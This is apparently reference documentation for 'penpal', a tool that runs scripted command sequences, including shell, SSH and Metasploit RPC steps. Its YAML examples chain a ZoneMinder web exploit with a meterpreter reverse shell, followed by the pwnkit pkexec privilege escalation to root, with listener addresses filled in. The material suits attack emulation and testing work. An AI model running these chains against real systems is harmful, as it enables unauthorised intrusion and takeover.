========
commands
========

This setting holds a list of commands that are executed sequentially from
top to bottom.

Every command, regardless of the type has the following options:

.. confval:: returncode_error

   If this option is true, penpal will stop the run if the command returns with a return code
   that is not zero.

   :type: bool
   :default: ``True``

.. confval:: error_if

   If this option is set, an error will be raised if the string was found in the output
   of the command.

   :type: str


.. confval:: error_if_not

   If this option is set, an error will be raised if the string was not found in the output
   of the command.

   :type: str


.. confval:: loop_if

   If this option is set, the command will be executed again if the string was found in the
   output of the command.

   :type: str


.. confval:: loop_if_not

   If this option is set, the command will be executed again if the string was not found in the
   output of the command.

   :type: str


.. confval:: loop_count

   This option controlls how often a command should be re-executed if loop_if ord loop_if_not is set.

   :type: int
   :default: ``3``

.. confval:: cmd

   This option stores the command that will be executed. This option might be implemented individually
   in each command-type.

   :type: str


shell
-----

This command executes local shell-commands.

.. confval:: cmd

   cmd stores the command-line that should be executed locally.

   :type: str


   .. code-block:: yaml

      ###
      msf_config:
        password: top-secret
        server: 10.18.3.86

      vars:
        $SERVER_ADDRESS: 192.42.0.254
        $NMAP: /usr/bin/nmap

      commands:
        - type: shell
          cmd: $NMAP $SERVER_ADDRESS

sleep
-----

This command sleeps a certain amount of time.

.. code-block:: yaml

   ###
   commands:
     - type: sleep
       seconds: 60


.. confval:: min_sec

   This option defines the minimum seconds to sleep. This
   is only relevant if option **random** is set to True

   :type: int
   :default: ``0``


.. confval:: seconds

   This options sets the seconds to sleep. If the option
   **random** is set to True, this option is the maximum time
   to sleep.

   :type: int
   :default: ``1``
   :required: True


.. confval:: random

  This option allows to randomize the seconds to wait. The minimum
  and maximum seconds for the range can be set by **min_sec** and
  **seconds**.


  :type: bool
  :default: ``False``


  The following example will take a random amount of seconds between 30 seconds
  and 60 seconds:

  .. code-block:: yaml

     ###
     commands:
       - type: sleep
         seconds: 60
         min_sec: 30


.. confval:: cmd

  This option is ignored

  :type: str
  :default: ``sleep``

ssh
---

Execute commands on a remote server via SSH.

.. note::

   This command caches all the settings so
   that they only need to be defined once.

.. code-block:: yaml

   vars:
     $SERVER_ADDRESS: 192.42.0.254
     $SSH_SERVER: 10.10.10.19

   commands:
     # creates new ssh-connection and session
     - type: ssh
       cmd: nmap $SERVER_ADDRESS
       hostname: 10.10.10.19
       username: aecid
       key_filename: "/home/alice/.ssh/id_rsa"
       creates_session: "attacker"

     # cached ssh-settings. creates new ssh-connection
     - type: ssh
       cmd: "echo $SERVER_ADDRESS"

     # reuses existing session "attacker"
     - type: ssh
       session: "attacker"
       cmd: "id"

.. confval:: hostname

   This option sets the hostname or ip-address of the
   remote ssh-server.

   :type: str

.. confval:: port

   Port to connect to on the remote host.

   :type: int
   :default: ``22``

.. confval:: username

   Specifies the user to log in as on the remote machine.

   :type: str

.. confval:: password

   Specifies the password to use. An alternative would be to use a key_file.

   :type: str

.. confval:: passphrase

   Use this passphrase to decrypt the key_file. This is only necessary if the
   keyfile is protected by a passphrase.

   :type: str

.. confval:: timeout

   The timeout to drop a connection attempt in seconds.

   :type: float

.. confval:: creates_session

   A session name that identifies the session that is created when
   executing this command. This session-name can be used by using the
   option "session"

   :type: str

.. confval:: session

   Reuse an existing ssh-session. This setting works only if another
   ssh-command was executed with the command-option "creates_session"

   :type: str

.. confval:: jmp_hostname

   This option sets the hostname or ip-address of the
   remote jump server.

   :type: str

.. confval:: jmp_port

   Port to connect to on the jump-host.

   :type: int
   :default: ``22``

.. confval:: jmp_username

   Specifies the user to log in as on the jmp-host.

   :type: str
   :default: ``same as username``


.. _msf-module:

msf-module
----------

This command executes Metasploit-Modules via Metasploits RPC-Api.

.. note::

   To configure the connection to the msfrpc-server see :ref:`msf_config`

Some Metasploit-Modules return output. Like the Auxilary-Modules:

.. code-block:: yaml

   msf_config:
     password: hackhelfer
     server: 10.18.3.86

   commands:
     - type: msf-module
       cmd: auxiliary/scanner/portscan/tcp
       options:
         RHOSTS: 192.42.0.254

Most Exploit-Modules don't create output but instead they create
sessions(see :ref:`msf-session`)

.. code-block:: yaml

   msf_config:
     password: hackhelfer
     server: 10.18.3.86

   commands:
     - type: msf-module
        cmd: exploit/unix/webapp/zoneminder_snapshots
        creates_session: "foothold"
        options:
          RHOSTS: 192.42.0.254
        payload_options:
          LHOST: 192.42.2.253
        payload: cmd/unix/python/meterpreter/reverse_tcp

.. confval:: cmd

   This option stores the path to the metasploit-module.

   :type: str

   .. note::

     Please note that the path includes the module-type.


.. confval:: target

   This option sets the payload target for the metasploit-module.

   :type: int
   :default: ``0``

.. confval:: creates_session

   A session name that identifies the session that is created by
   the module. This session-name can be used by :ref:`msf-session`

   :type: str

.. confval:: session

   This option is set in exploit['SESSION']. Some modules(post-modules)
   need a session to be executed with.

   :type: str

.. confval:: payload

   Path to a payload for this module.

   :type: str

   The following example illustrates the use of sessions and payloads:

   .. code-block:: yaml

      commands:
        - type: msf-module
           cmd: exploit/unix/webapp/zoneminder_snapshots
           creates_session: "foothold"
           options:
             RHOSTS: 192.42.0.254
           payload_options:
             LHOST: 192.42.2.253
           payload: cmd/unix/python/meterpreter/reverse_tcp

         - type: msf-module
           cmd: exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
           session: "foothold"
           creates_session: "root"
           options:
             WRITABLE_DIR: "/tmp"
           payload_options:
             LHOST: 192.42.2.253
             LPORT: 4455
           payload: linux/x64/shell/reverse_tcp

.. confval:: options

   Dict(key/values) of module options, like RHOSTS:

   :type: Dict[str,str]

.. confval:: payload_options

   Dict(key/values) of payload options, like LHOST and LPORT:

   :type: Dict[str,str]


.. _msf-session:

msf-session
-----------

This command allowes to read and write commands to (Meterpreter)sessions that
have previously created by msf-modules(see :ref:`msf-module`).


.. note::

   To configure the connection to the msfrpc-server see :ref:`msf_config`

.. confval:: stdapi

   Load stdapi module in the Meterpreter-session.

   :type: bool
   :default: ``False``

.. confval:: write

   Execute a raw write-operation without reading the output.

   :type: bool
   :default: ``False``

.. confval:: read

   Execute a raw read-operation without a write-operation.

   :type: bool
   :default: ``False``

.. confval:: session

   Use this session for all operations.

   :type: str
   :required: True

.. confval:: end_str

   This string indicated the end of a read-operation.

   :type: str
